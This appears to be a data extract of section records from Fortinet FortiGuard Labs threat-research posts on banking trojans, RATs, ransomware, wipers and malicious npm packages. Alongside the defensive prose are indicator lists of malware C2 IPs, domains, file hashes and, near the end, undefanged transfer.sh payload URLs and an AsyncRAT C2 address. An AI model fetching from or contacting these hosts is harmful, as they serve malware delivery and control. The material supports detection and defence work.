acf9777d3fabc82b49ddb096147de6a9\nbinarium-crm-1.9.9 index.js\nMD5: acf9777d3fabc82b49ddb096147de6a9\ncareer-service-client-0.1.6 index.js\nMD5: 3d1dbd501ebaae4745f6ec37850f9ff5\ncareer-service-client-0.1.13 index.js\nMD5: 3d1dbd501ebaae4745f6ec37850f9ff5\ncareer-service-client-0.1.15 index.js\nMD5: 3d1dbd501ebaae4745f6ec37850f9ff5\nhh-dep-monitoring-0.1.5 index.js\nMD5: 3d1dbd501ebaae4745f6ec37850f9ff5\nhh-dep-monitoring-0.1.14 index.js\nMD5: 3d1dbd501ebaae4745f6ec37850f9ff5\norbitplate-1.0.4 index.js\nMD5: 3d1dbd501ebaae4745f6ec37850f9ff5\norbitplate-1.0.6 index.js\nMD5: 3d1dbd501ebaae4745f6ec37850f9ff5", "source": "Fortinet"}, {"title": "Introduction", "content": "Let's face it: Cyberthreats aren't going anywhere. As technology continues to evolve and grow, so will the tactics and techniques used by threat actors. A recentreport from Statistaestimates the global cost of cybercrime to reach $15.63 trillion by 2029. To combat this, one of the most important things organizations can do is be prepared.According to the National Institute of Standards and Technology(NIST), the incident response life cycle can be broken down into four key stages, with the first, and arguably most important, being preparation.\nYour organization can take several proactive preparatory steps to ensure incident response (IR) readiness, including evaluating the existing threat landscape of your environment. These steps include conducting regular risk assessments, implementing comprehensive security policies, and providing continuous monitoring and threat intelligence gathering. Organizations can enhance their IR capabilities by investing in training programs and simulation exercises, enabling a swift and effective reaction to cyber incidents.\nLet's examine several readiness activities that can be conducted well before any cybersecurity incident. These activities can ultimately help improve your organization's overall IR and cybersecurity maturity.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Controls victim's device and collects sensitive informationSeverity Level:High\nOver the past month, FortiGuard Labs has identified several similar LNK files containing PowerShell commands designed to execute malicious scripts and connect to remote servers. These files are part of multi-stage operations that ultimately deliver the Coyote Banking Trojan. This malware primarily targets users in Brazil, seeking to harvest sensitive information from over 70 financial applications and numerous websites. Once deployed, the Coyote Banking Trojan can carry out various malicious activities, including keylogging, capturing screenshots, and displaying phishing overlays to steal sensitive credentials. In this article, we will detail the behavior of each stage.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Coyote's infection process is complex and multi-staged. This attack leveraged an LNK file for initial access, which subsequently led to the discovery of other malicious files. This Trojan poses a significant threat to financial cybersecurity, particularly because it has the potential to expand beyond its initial targets. Consequently, it highlights the critical need for robust security measures for both individuals and institutions to safeguard against evolving cyber threats.\nFortinet Protections\nThe malware described in this report is detected and blocked byFortiGuard Antivirusas:\nLNK/Agent.D!tr\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected.\nTheFortiGuard Web FilteringService blocks the C2 server.\nWe also suggest that organizations go through Fortinet's free cybersecurity training module:Fortinet Certified Fundamentals (FCF)in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks.\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team.", "source": "Fortinet"}, {"title": "ioc", "content": "URLs\nhxxps://btee[.]geontrigame[.]com/mvkrouhawmjxxps://qmnw[.]daowsistem[.]com/fayikyeundhxxps://bhju[.]daowsistem[.]com/iwywybzqxkhxxps://lgfd[.]daowsistem[.]com/riqojhyvnrhxxps://leme[.]daowsistem[.]com/omzowcicwphxxps://igow[.]scortma[.]com/fqieghffbmhxxps://quit[.]scortma[.]com/xzcpnnfhxihxxps://llue[.]geontrigame[.]com/byyyfydxyfhxxps://cxmp[.]scortma[.]com/qfutdbtqquhxxps://xrxw[.]scortma[.]com/gmdroacyvihxxps://qfab[.]geontrigame[.]com/vfofnzihsmhxxps://tbet[.]geontrigame[.]com/zxchzzmismhxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw\nHosts\ngeraatualiza[.]commasterdow[.]comgeraupdate[.]com\nFiles\n362af8118f437f9139556c59437544ae1489376dc4118027c24c8d5ce4d84e48330dffe834ebbe4042747bbe00b4575629ba8f2507bccf746763cacf63d655bb33cba89eeeaf139a798b7fa07ff6919dd0c4c6cf4106b659e4e56f15b5809287552d53f473096c55a3937c8512a06863133a97c3478ad6b1535e1976d1e0d45f64209e2348e6d503ee518459d0487d636639fa5e5298d28093a5ad41390ef6b067f371a683b2be4c8002f89492cd29d96dceabdbfd36641a27be761ee64605b173ad6be67691b65cee251d098f2541eef3cab2853ad509dac72d8eff5bd85bc07cbfbce482071c6df823f09d83c6868d0b1208e8ceb70147b64c52bb8b48bdb8839de445f714a32f36670b590eba7fc68b1115b885ac8d689d7b344189521012bea4f753707eba4088e8a51818d9de8e9ad0138495338402f05c5c7a800695a6f3c37b1de5983b30b9ae70c525f97727a56d3874533db1a6e3dc1355bfbf37ecfd0ef425d34b56d0bc08bd93e6ecb11541bd834b9d4d417187373b17055c862e", "source": "Fortinet"}, {"title": "Introduction", "content": "In today's dynamic threat environment, staying informed and proactive is crucial for any organization seeking to protect its networks. The FortiGuard Labs Outbreak Alerts Annual Report 2023 is a comprehensive resource that delves into real-world examples of attacks across diverse verticals, offering valuable insights into the most significant cyberattacks of 2023 and critical information that organizations can use to evaluate their cybersecurity posture.", "source": "Fortinet"}, {"title": "Conclusion", "content": "The FortiGuard Labs Outbreak Alerts Annual Report 2023 is a vital resource for anyone wanting to gain a holistic view of cyberthreats. By understanding the various significant threats and translating that information into proactive measures, organizations can better protect themselves from cyberattacks.\nDownloadthe FortiGuard Labs Outbreak Alerts Annual Report 2023.\nStay ahead of the latest threats bysubscribing to outbreak alertsfrom FortiGuard Labs.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Linux DistributionsImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High\nCybersecurity threats are increasingly leveraging cloud services to store, distribute, and establish command and control (C2) servers, such asVCRUMSstored on AWS orSYK Crypterdistributed via DriveHQ. This shift in strategy presents significant challenges for detection and prevention, as cloud services provide scalability, anonymity, and resilience that traditional hosting methods lack.\nOver the past month, FortiGuard Labs has been monitoring botnets that have adopted this strategy, abusing cloud services to enhance their malicious capabilities. These botnets, such as UNSTABLE and Condi, have been observed leveraging cloud storage and computing services operators to distribute malware payloads and updates to a broad range of devices. Using cloud servers for C2 operations ensures persistent communication with compromised devices, making it harder for defenders to disrupt an attack. We have also observed a threat actor exploiting multiple vulnerabilities to target JAWS webservers, Dasan GPON home routers, Huawei HG532 routers, TP-Link Archer AX21, and Ivanti Connect Secure to amplify their attacks.\nIn this article, we will detail this threat actor's initial attack method and further explore the botnets being used.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Cloud services' inherent flexibility and efficiency have unwittingly provided cybercriminals with a new arena for their activities. This shift to cloud-based operations marks a significant evolution in the threat landscape, with malware operators exploiting these platforms' advantages. Organizations must bolster their cloud security defenses as botnets and DDoS tools continue to leverage cloud services. Robust security measures and vigilant monitoring within cloud environments are imperative to combat these sophisticated attacks. Implementing a multi-layered security approach, including regular patching, updates, and network segmentation, is essential to isolate critical assets and mitigate potential breaches.", "source": "Fortinet"}, {"title": "ioc", "content": "C2\n45[.]128[.]232[.]15\n45[.]128[.]232[.]90\n45[.]128[.]232[.]229\n45[.]128[.]232[.]234\nURLs\nhxxp://45[.]128[.]232[.]15\nhxxp://45[.]128[.]232[.]90\nhxxp://45[.]128[.]232[.]229\nhxxp://209[.]141[.]35[.]56/getters\nhxxp://45[.]128[.]232[.]234\nFiles\nd5e81e9575dcdbbaa038a5b9251531d8beccedc93bd7d250a4bb2389c1615cd6\n6226e896850de8c5550b63481b138067582ebf361f7c5448d9d0596062150d89\n4c2dcd13685f24800b73856d1f3ec9a2c53c2b5480a9c10b73035a43df26c2e8\n31914b317ba6a44a9d3acb99979ec8c163bef8667b0ae41524e335847d70afb0\n5fbfc4c8204309e911d22d3b544773f8d4f9ab2edc71f8967bbdcce6cbc834ca\n53daa1e4c2f5c11a75989334c2a0227689509606aeda9d7ab11dd200ee6138c6\na9690df4542f28fc4e3b9161b9f8d685d4ce8753bfd9b1f5c8aacd6aa4bef873\nfb86bb0863d15ac65a916979052220f755765eb0d5bc4c1c47e34762738d2311\ncd05eaa2b01ec1a4880839628d1c6e3bed9045478cacbfb88f14d1937ccf667b\nc88da56b348f8d89b5ab99a710de7131bdbc2f1dba4bb9809b1b3fd27322630e\n83a2608a93b643f68ab3dcfccf8de7b13394cc214a78fa59b6867e47fc56928c\n3660fbe90420f60664e68859de918a5c592dd33024f69bebff8bb77ab41b8fca\n75b594a20110e487e35ec4590a5211a425119cdf0fea6fcf030ee20cb548b7e5\nef2e57a5992d85ea2bfb5c5645f8b361dcd5c49eede38185a7b99ec00c287550\n2e69d9942a4c0d6d0294d038263f2d12f3a5f6aef8d72279b01e025d32addab2\n1a8508f62447e5ee624866b571a29cedc369d6ee8182782f32a75dcd58494d8c\n305e0eb9b815dddd40d73f4464946a0ec21866b7727e4fe073692bf82bb46936\n0092b27bee2df9536e8aff8948a1007ed1eb03f0e12e0348b72a113e7d4cb585\n65f2850892365a4d6bafc303ed04379bef3b41a85336e274f9348603105d2f37\nc569eb7f33dcec3e6cdcfee7195202813fda6b7bf9ecb786a4a909d6745cbbff\n5110f8af13cdd872b904784d2aec75031c663baad01d68b5f05daa950d18ced3\neec122d6480803bcdd2c6906b0ae35bcffaf6bf5117dac8c7b2621f0b98b68ea\n9f14cdea1b41ac1c7251e3f2d4186e12d480d108942bc8f1f7bcac133ed88ccc\n5a0a8de050cc8ad2f9af41e4018b0317afc39c571f23bc9cfa115c6558205722\neb9ba3171a98dc543cbc599eb6ab9aa3a5a47cc6931afe511fa839c6a5fb889c\n1825c787c308d3cb1125d416025af8c8344a158f0a0b3467df6c0c875d2d8800\neb926f93bdd9b38d44d2239b4ec9c1d45762f850bee80cf9556b23372b6f0639\n8fb6110b2114e7786b1d4e7f600a08de0a25432417f863d9663d576a3c895e86\ndc87ff82199cb60a8bcf59d4f8c0a706bf10051d0c15a911d37d1cda8fcf5f9e\n1816c473ba94f4740c0931e118d038ecb0733f8ffb7cbb74dedc7b78952f8318\nd4dbd379f914ff5ba40c1aac1be37602e4cde687e47cfd7793cb10192617f4af\nd034664f627af11bd2a34ba1b228b5a6841309caabfd72a731bbd4724d947e27\n4cc2110f89afac1de0c1989d0af07f8879003cac0803660f37cf394a0027db69\nbd42e67e6238dfec0b7786797733c54ae1d92fe0e883758dddea779e113b5271\nbd42e67e6238dfec0b7786797733c54ae1d92fe0e883758dddea779e113b5271\ne758c4428a590519a281344a31f236146c996c784433fbe82eee009dd922516c\n3a3581da268d0fdb8c8027e261b682b07b6715c62fbf2c8aca301b7e8dd9d637\n6e21e400928f24630339441f6da0f3f1b66860bf480a9f5af20482878b686189\n8363ecc977d426f0e922abbeb4f1e8ed06397c0b6951dd75233016d3b5af58c9\ne511f5c8fc0bd713dc9b9742e8c682ba66177bb617e9118f84b150cf6ff4a07f\nddcb420c4141760feed2fc8c76425b72ab111d271385040c1446f6ab3993c6d7\n2b526e5ac01916d74e7aa88770102a8f34d4c57cea7a4e45c501331670635e26\n666eed520d2b430e1016eec555c0cd125912f9a8f7590d77c286eff52416fbaf\nba4229f5e44c378ae293b58139233a9bfbecbfd22fb51e05f74de38b186a071c\nc376db6e6f6905113e7beb1f14d8e5a44b8374a959eefd0f5d25ab0f3cbabee2\nae999de92c369e53a3287ab034f2839367b44f7fd82d6ed56a5700c22ed44635\ne94b6b99fae4dc8e5b0796c877ed01bf25f77ccab95fb43d24abed00e0f8a15a\n8fcb5c4c5306f3e7ffa2a47dedaddc108c77ef8ef48ec0980a0c441333e0a18b\n34f653119e418621c1cbfe7cf0614ea62e9a98dc345e4d7408eea96a08d3ac0d\na51333460fb711e0b172b6e4893d5bca6b9996f240b450fdaa5cbf14511c9e27\n90a43ca83efb2d460b86ff897b1bc657170b6c79c2c804610cdfca8f24adc71e\nc5b6320925963ca6d5439dca7154c526c3a26500e204b48ff30a50c3a1b875ad\ne7d87e68265a9a324d76759cca4f613c28c590b36490c8c65ee3d17918e5d3ec\n2867b3fd3c840aa9c868a88a5f6d417a09e4158f8209f0450a07eeb7e99ba4c8", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High\nIn January 2025, FortiGuard Labs observed an attack that used Winos4.0, an advanced malware framework actively used in recent threat campaigns, to target companies in Taiwan. Figure 1 shows an example of the attack chain. Usually, there is a loader that is only used to load the malicious DLL file, and the Winos4.0 module is extracted from the shellcode downloaded from its C2 server.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Winos4.0 makes good use of registry keys. The C2 server writes most configurations for optional features and encrypts data to the values of the base registry key and its subkeys. This provides the flexibility of optional features. However, it's also a good hint for forensic analysis. We can rebuild files from the data and perform further analysis. FortiGuard will continue monitoring these attack campaigns and providing appropriate protections as required.\nFortinet Protections\nThe malware described in this report is detected and blocked byFortiGuard Antivirusas:\nPDF/Agent.A6DC!tr.dldrW32/Agent.7BBA!trW64/UACMe.O!trW64/ValleyRat.A!tr.spy\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected.\nThe FortiGuard CDR (content disarm and reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document.\nWe also suggest that organizations go through Fortinet's freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks.\nFortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team.", "source": "Fortinet"}, {"title": "ioc", "content": "43[.]137[.]42[.]254206[.]238[.]221[.]60206[.]238[.]221[.]240124[.]156[.]100[.]172206[.]238[.]221[.]244\n1234[.]360sdgg[.]com9001[.]360sdgg[.]com9002[.]360sdgg[.]com9003[.]360sdgg[.]com9005[.]360sdgg[.]com9006[.]360sdgg[.]com9007[.]360sdgg[.]com9009[.]360sdgg[.]com9010[.]360sdgg[.]comffggssa-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]comfuued5-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]com0107-1333855056[.]cos[.]ap-guangzhou[.]myqcloud[.]comrgghrt1140120-1336065333[.]cos[.]ap-guangzhou[.]myqcloud[.]comhei-1333855056[.]cos[.]ap-guangzhou[.]myqcloud[.]comchakan202501-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]comwrwyrdujtw114117-1336065333[.]cos[.]ap-guangzhou[.]myqcloud[.]comfdsjg114-1336065333[.]cos[.]ap-guangzhou[.]myqcloud[.]comsjujfde-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]comhtrfe4-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]com0611-1333855056[.]cos[.]ap-guangzhou[.]myqcloud[.]comtwzfw[.]vip\n36afc6d5dfb0257b3b053373e91c9a0a726c7d269211bc937704349a6b4be9b90e3c9af7066ec72406eac25cca0b312894f02d6d08245a3ccef5c029bc297bd267395af91263f71cd600961a1fd33ddc222958e83094afdde916190a0dd5d79cf4d3477a19ff468d234a5e39652157b2181c8b51c754b900bcfa13339f577e7cc9a8db23d089aa71466b4bde51a51a8cfdcc28e8df33b4c63ce867bd381e5fe5\ne2b75baeb7ed21fb8f27984f941286770d1c3c0b60fce8d7fa5b167bd24ba6dcdffbeefc632b20d2ef867553684e9971ab76e1223e743604a5275713423b616820c34b5f0983021414b168913c3da267caf298d8f0f5e3ec0ce97db5f4f483166c33715a14fdc917b5b09b6e1b5dad07bb769493eafbf7ca1023830b4059e00375a4d75c35724140149c9c5056c1bcbd328bbe1e5d1d1ef34205ed5442d2b348fed394a3653b7c6fcc1b277eda6e18eb0983a7e024be5b51e5188b3cfb9512e8a067d848f099e6d1e465f9761a5b85392d550303bfa75fac920d444fd980c949c55757075259fa4be6941dd273c4a4a2fcc29e6ba427dec124b25b299b3505fe64a876e6cb3cf3122febc84a00ec3e0740c054cff955164971c470e1b5e5f1bbd4ac82de8dda9796579cd8ea0f84b43c7a980cdb0e9cdb8abe8981a2d215ed2f(20c34b5f0983021414b168913c3da267caf298d8f0f5e3ec0ce97db5f4f48316 Corrupt)\n268c72f5482374660a132d1b91cac0c04b4724a214db4f052eb421e36c2829210a4bbb998bd3a3bcc72cf759689a5656dc74590b731d0affbfc317cf484ed28b79c64d2e77acdbcdbd35cbb29497941335d7e3ab6ebb474064f095e745f0d6437f22305679e46e1fd5043beb136108197c0921643ce0d680f990a3018ade485b594d907855d35ee7689a568e4ac43e4e0ed90de047d91b0253ef79da71ecbc081f3b041eee1ece8cf6aa5c742aeb8c0ac2266cccecca7888772509227c4f8669514933468ac1dd9f7db4e2693f1be7f84deb35c33f8f9934fad32caaae9ef6117a5b26f6dd7b8e0d648e9804ec932603b7d7a5f76c7a8c537ab0c2be54f51fa98b1b9a789136ca3abe25938204845c351aaf0c97c0708ade8d4d8ba4ded95ba71ad1f2eec961bc7a35abeac486f843b7caece0929b13f1dab47fbdc0406ac4e34c1ea827713f1eb57cc0e8e9d171d4e21d116f846b174bc05114eef5674c96531a342426d59e7fdc4abfb74c2225f68382172e03b0f8d496a57ae647411f0fbd2ce73cbfab0beb3663c0151ba7c310e4dbf69f295d8a18114435506483d774ac0a4bbb998bd3a3bcc72cf759689a5656dc74590b731d0affbfc317cf484ed28b514933468ac1dd9f7db4e2693f1be7f84deb35c33f8f9934fad32caaae9ef61176ac08358f230bca3e8b8448b3c177094aeac25402b929f5f73869ec77173a44", "source": "Fortinet"}, {"title": "Introduction", "content": "In the second half of 2023, the cybersecurity landscape experienced various significant developments-like the rise in sophisticated attacks targeting large-scale enterprises and critical industries-that impact every organization.\nIn our2H 2023 Threat Landscape Report, we examine the cyberthreat landscape over the year's second half to identify trends and offer insights on what security professionals should know to effectively protect their organizations. The report findings are based on the collective intelligence ofFortiGuard Labs, drawn from Fortinet's vast array of sensors collecting billions of threat events observed worldwide during this same period. Below are key takeaways from the report.", "source": "Fortinet"}, {"title": "Summary", "content": "During this period, we observed substantial activity among APT groups, more targeted ransomware attacks, new botnets and malware strains, and an uptick in IoT exploits. We're seeing a continued trend of threat actors reusing \"old\" attacks, underscoring the importance of security practitioners remaining vigilant, as attackers aren't likely to stop exploiting older vulnerabilities.\nNotably, adversaries are moving quicker than ever, exploiting new vulnerabilities 43% faster than in the first half of the year. This finding underscores the need for organizations to improve their patch management processes, ensuring that they're updating software regularly to protect against fast-moving adversaries. Vendors also play a vital role in enabling customers to mitigate vulnerability risk. Every vendor has a responsibility to dedicate themselves to radical transparency, introducing robust security scrutiny at all stages of the product development lifecycle and proactively searching for and disclosing vulnerabilities.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:All platforms with Java installedImpacted parties:Any organizationImpact:Attackers gain control of the infected systemsSeverity level:High\nRecently, FortiGuard Labs uncovered a phishing campaign that entices users to download a malicious Java downloader with the intention of spreading new VCURMS and STRRAT remote access trojans (RAT). The attackers stored malware on public services like Amazon Web Services (AWS) and GitHub, employing a commercial protector to avoid detection of the malware. The attacker attempts to use email as its command and control throughout the attack campaign. The receiving endpoint utilizes Proton Mail, which offers email services that include privacy protection. Figure 1 shows the attack chain.\nThis blog describes how the malware is delivered and specifically examines the unusual VCURMS RAT that is involved in this campaign.", "source": "Fortinet"}, {"title": "Protect", "content": "The most downloaded malware in this campaign are obfuscated using the Branchlock obfuscator. Information about this obfuscator is located at the end of the JAR file as shown in Figure 10.\nTheNarumii/Deobfuscatorplays a crucial role in partially supporting the deobfuscation of a program obfuscated with Branchlock.", "source": "Fortinet"}, {"title": "Conclusion", "content": "This comprehensive attack operation deploys several malicious programs simultaneously on a victim's system. It deploys a well-known STRRAT and a new VCURMS based on Java. Even though the VCURMS RAT primarily handles command and control communication, it also includes a modified version of a Rude Stealer and a keylogger in its second phase to gather sensitive data from the victim's system. We discovered that the threat actor was using multiple obfuscation techniques to avoid detection and attempting to use email for communicating with the command and control server.\nFortinet Protections\nThe malware described in this report are detected and blocked byFortiGuard Antivirusas:\nJava/Agent.A881!trJava/Agent.X!tr.spyJava/Agent.A249!trJava/Agent.6057!trJava/Agent.E730!tr\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\nTheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros within the document.\nWe also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\nFortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team.", "source": "Fortinet"}, {"title": "ioc", "content": "E-mails\ncopier@ferrellengineering[.]comsacriliage@proton[.]me\nDomains\nbankofindustry[.]s3[.]us-east-2[.]amazonaws[.]comriseappbucket[.]s3[.]ap-southeast-1[.]amazonaws[.]comofornta[.]ddns[.]netjbfrost[.]livebackinghof[.]ddns[.]net\nFiles\n97e67ac77d80d26af4897acff2a3f6075e0efe7997a67d8194e799006ed5efc98d72ca85103f44742d04ebca02bff65788fe6b9fc6f5a411c707580d42bbd249588d6f6feefa6273c87a3f8a15e2089ee3a063d19e6a472ffc0249298a72392d8aa99504d78e88a40d33a5f923caf7f2ca9578031d004b83688aafdf13b3b59fc0d0dee9b8345da3c6cf3e1c3ce5b5b6e8c9e4002358517df1e3cd04c0f0b3d1", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:Microsoft WindowsImpacted parties:Windows usersImpact:Control and collect sensitive information from a victim's deviceSeverity level:Critical\nIn a recent FortiGuard Labs investigation, we came across several malicious Microsoft Office documents designed to exploit known vulnerabilities. Specifically, CVE-2021-40444 and CVE-2022-30190 are remote code execution vulnerabilities. Exploiting these vulnerabilities allowed the attackers to embed malicious macros within Microsoft documents that, when executed, dropped the LokiBot malware onto the victim's system. LokiBot, also known as Loki PWS, has been a well-known information-stealing Trojan active since 2015. It primarily targets Windows systems and aims to gather sensitive information from infected machines.\nIn this article, we will delve into the specifics of the identified documents, explore the payload they delivered, and outline the behavioral patterns exhibited by LokiBot. Our analysis aims to shed light on the intricacies of this threat and increase awareness regarding its operational methods.", "source": "Fortinet"}, {"title": "Conclusion", "content": "LokiBot is a long-standing and widespread malware active for many years. Its functionalities have matured over time, making it easy for cybercriminals to use it to steal sensitive data from victims. The attackers behind LokiBot continually update their initial access methods, allowing their malware campaign to find more efficient ways to spread and infect systems.\nLokiBot exploits various vulnerabilities and employs VBA macros to launch its attacks. It also leverages a VB injector to employ several techniques to evade detection or analysis. As a result, it can bypass certain security measures and pose a significant threat to users.\nTo protect themselves, users should exercise caution when dealing with any Office documents or unknown files, especially those that contain links to external websites. It is essential to be vigilant and avoid clicking on suspicious links or opening attachments from untrusted sources. Additionally, keeping the software and operating systems up to date with the latest security patches can help mitigate the risk of exploitation by malware.", "source": "Fortinet"}, {"title": "ioc", "content": "C2:\n95[.]164[.]23[.]2\nFiles:\n17d95ec93678b0a73e984354f55312dda9e6ae4b57a54e6d57eb59bcbbe3c38223982d2d2501cfe1eb931aa83a4d8dfe922bce06e9c327a9936a54a2c6d409ae9eaf7231579ab0cb65794043affb10ae8e4ad8f79ec108b5302da2f363b77c93da18e6dcefe5e3dac076517ac2ba3fd449b6a768d9ce120fe5fc8d6050e09c552e3e5642106ffbde1596a2335eda84e1c48de0bf4a5872f94ae5ee4f7bffda3980f4803c1ae286005a64ad790ae2d9f7e8294c6e436b7c686bd91257efbaa1e521675edce1fdabfee96407ac2683bcad0064c3117ef14a4333e564be6adf05394a23054c2241e20aec97c9b0937a37f63c30e321be01398977e13228fa980f29", "source": "Fortinet"}, {"title": "Introduction", "content": "This post will discuss the solution to the specific technical challenges we faced when analyzing themalwaredescribed in the blog \"Fake Hungarian Government Email Drops Warzone RAT.\" The final payload in that campaign, Warzone RAT, was deployed through a chain of increasingly obfuscated .NET binaries. Each stage loaded the next from somewhere in the binary, decoded it, loaded it into memory, and invoked a function to pass the control-flow to the next stage. Such a multi-stage loader can make dynamic analysis difficult because every time the malware sample is restarted, navigating through the different stages can be challenging. To circumvent this problem, we created standalone executables from the various stages to enable more efficient debugging. This is what we are going to discuss in this post.", "source": "Fortinet"}, {"title": "Conclusion", "content": "This blog post looked at how we can create a custom .NET program to help debug a DLL loaded and invoked directly in memory. We also looked at how to add a resource to the program to satisfy the requirements of the debugged binary. And finally, we debugged the target DLL to dump the next stage binary and find out which function is its entry point.", "source": "Fortinet"}, {"title": "Introduction", "content": "In the last issue of ourRansomware Roundupseries, we discussed a publicly available open-source ransomware toolkit called Cryptonite. As part of that investigation, we also discovered a Cryptonite sample in the wild that never offers the decryption window, instead acting as a wiper. We recently saw an increase in ransomware intentionally turned into wiper malware, primarily as part of a political campaign. So in this post, we take a closer look at the Cryptonite wiper sample.\nAffected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine without offering decryptionSeverity level:High", "source": "Fortinet"}, {"title": "Summary", "content": "Let's start with the good news: since the release of our Ransomware Roundup and with the help of the security community, the Cryptonite source code was removed from GitHub (Figure 1).\nAnd even though the original repository was forked 41 times on GitHub, all of these were also removed.\nLooking at the contributions of the repository, we can see that it was primarily developed by the CYBERDEVILZ group, with the help of only a few contributors (Figure 2).\nCryptonite's ransomware sample only implements a barebones ransomware functionality. The operator can configure a few things, such as an exclusion list, server URL, email address, andbitcoin wallet. However, the encryption and decryption are very simple and not robust. It also does not provide any of the currently typical (but more complex) ransomware features, including:\n- Windows Shadow Copy removal- File unlocking for a more thorough impact- Anti-analysis- Defensive evasion (AMSI bypass, disabling event logging, etc.)\nEven though this ransomware variant provided an easy entry for newcomers to the ransomware business, it isn't a serious tool.", "source": "Fortinet"}, {"title": "Conclusion", "content": "This sample demonstrates how a ransomware's weak architecture and programming can quickly turn it into a wiper that does not allow data recovery. Although we often complain about the increasing sophistication of ransomware samples, we can also see that oversimplicity and a lack of quality assurance can also lead to significant problems. On the positive side, however, this simplicity, combined with a lack of self-protection features, allows every anti-virus program to easily spot this malware.", "source": "Fortinet"}, {"title": "Introduction", "content": "On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants.\nThis edition of the Ransomware Roundup covers the Knight ransomware.\nAffected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts and exfiltrates victims' files and demands ransom for file decryptionSeverity level:High", "source": "Fortinet"}, {"title": "Victimology", "content": "According to data collected through Fortinet'sFortiRecon service, the Knight ransomware group has targeted multiple industry verticals. While Retail was most affected by the Knight ransomware, the group also victimized organizations in healthcare, including hospitals, physicians' clinics, and dental offices, indicating that the threat actor has no reservations about impacting people who need medical care.\nWhen classifying victim organizations by country, the United States is in first place by a significant margin.\nAs of October 20, 2023, the Knight ransomware group had last posted new victims on October 18th.", "source": "Fortinet"}, {"title": "Data Leak Site", "content": "The Knight ransomware group owns a TOR site where victims can contact the threat actor. Stolen information and a list of victims are also posted there.\nThe group also uses another TOR site for disclosing stolen data and has abused several publicly available file-sharing services, such as Mega, Gofile, and UploadNow.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully control the victim's computerSeverity level:Critical\nA couple of phishing campaigns that recently caught FortiGuard Labs' attention were found sending phishing emails with attached malicious Microsoft OneNote files to spread the AsyncRAT malware.\nAs a cybersecurity researcher, I conducted an in-depth analysis of these phishing campaigns, tracing the entire process from the initial phishing email to the final deployment of AsyncRAT, which gains complete control of the victim's device.\nIn this analysis, you will learn about the contents of this attack, such as what kind of phishing email starts the campaign, how a malicious Microsoft OneNote file is involved in the campaign, how it is leveraged to download and executemalicious fileson the victim's device, the kinds of techniques that enable it to evade detection and analysis, and how the malware \u2013 AsyncRAT \u2013 communicates with its C2 server, including what control commands it supports to fully control the victim's device.\nThe following flowchart roughly describes the entire process of how the phishing campaign delivers and executes AsyncRAT:", "source": "Fortinet"}, {"title": "Summary", "content": "I have explained how the phishing campaign started with a SPAM email, how a Microsoft OneNote file is involved, and what BAT files are leveraged to download more malicious files (like Io.bat, view.zip).\nWe also explored the anti-analysis techniques it uses to evade being detected and analyzed by security researchers. I elaborated on how a complicated strategy is used to protect its code, such as loading executable files from the PE Resource section, always keeping the key modules fileless, and creating a target notepad.exe process on behalf of explorer.exe.\nFinally, I demonstrated what the packet format looks like, what essential information AsyncRAT can collect from the victim's device, and what control commands AsyncRAT supports to fully control the victim's device.", "source": "Fortinet"}, {"title": "ioc", "content": "URLs:\nhttps://transfer.sh/get/IKRQSd/view.zip\nhttps://transfer.sh/get/sxSJuL/lo.bat\nC2 Server List:\n95.216.102.32:8808\nRelevant Sample 